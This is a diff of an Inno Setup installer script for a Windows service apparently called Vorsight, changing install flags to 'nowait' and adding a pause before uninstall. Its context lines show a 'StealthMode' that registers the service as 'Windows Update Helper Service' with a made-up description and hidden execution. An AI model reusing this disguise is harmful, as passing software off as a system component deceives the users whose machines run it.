@@ -166,10 +166,10 @@ end;
 [Run]
 ; Install and start the Windows Service
 #if StealthMode == 1
-  Filename: "{app}\{#MyAppServiceExeName}"; Parameters: "install --service-name WindowsUpdateService --display-name ""Windows Update Helper Service"" --description ""Provides background update checking and system health monitoring"""; StatusMsg: "Installing Windows service..."; Flags: runhidden waituntilterminated
+  Filename: "{app}\{#MyAppServiceExeName}"; Parameters: "install --service-name WindowsUpdateService --display-name ""Windows Update Helper Service"" --description ""Provides background update checking and system health monitoring"""; StatusMsg: "Installing Windows service..."; Flags: runhidden nowait
   Filename: "sc"; Parameters: "start WindowsUpdateService"; StatusMsg: "Starting service..."; Flags: runhidden nowait
 #else
-  Filename: "{app}\{#MyAppServiceExeName}"; Parameters: "install"; StatusMsg: "Installing Windows service..."; Flags: runhidden waituntilterminated
+  Filename: "{app}\{#MyAppServiceExeName}"; Parameters: "install"; StatusMsg: "Installing Windows service..."; Flags: runhidden nowait
   Filename: "sc"; Parameters: "start VorsightService"; StatusMsg: "Starting service..."; Flags: runhidden nowait
 #endif
 
@@ -177,9 +177,11 @@ end;
 ; Stop and uninstall the service
 #if StealthMode == 1
   Filename: "sc"; Parameters: "stop WindowsUpdateService"; Flags: runhidden waituntilterminated
+  Filename: "timeout"; Parameters: "/t 2 /nobreak"; Flags: runhidden waituntilterminated
   Filename: "{app}\{#MyAppServiceExeName}"; Parameters: "uninstall --service-name WindowsUpdateService"; Flags: runhidden waituntilterminated
 #else
   Filename: "sc"; Parameters: "stop VorsightService"; Flags: runhidden waituntilterminated
+  Filename: "timeout"; Parameters: "/t 2 /nobreak"; Flags: runhidden waituntilterminated
   Filename: "{app}\{#MyAppServiceExeName}"; Parameters: "uninstall"; Flags: runhidden waituntilterminated
 #endif
 
